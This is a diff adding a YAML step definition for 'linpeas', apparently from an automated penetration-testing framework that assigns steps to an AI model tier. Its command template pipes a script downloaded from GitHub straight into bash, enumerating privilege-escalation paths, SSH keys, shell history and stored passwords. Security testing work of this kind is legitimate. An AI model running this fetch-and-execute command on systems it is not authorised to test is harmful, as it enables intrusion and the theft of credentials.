@@ -1,0 +1,17 @@
+name: linpeas
+category: privesc
+description: Linux privilege escalation automated enumeration
+preconditions:
+  - os==linux
+parameters: {}
+command_template: "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash"
+parser: linpeas_parser
+expected_effects:
+  - privesc_vectors_enumerated
+  - cron_jobs_found
+  - writable_paths_found
+falsifier:
+  pattern: "command not found"
+  timeout: 300
+model_tier: haiku
+mechanism: "Comprehensive Linux privesc enumeration: SUID, capabilities, cron, writable dirs, kernel version, docker membership, interesting files (id_rsa, .bash_history, config files with passwords), services running as root."
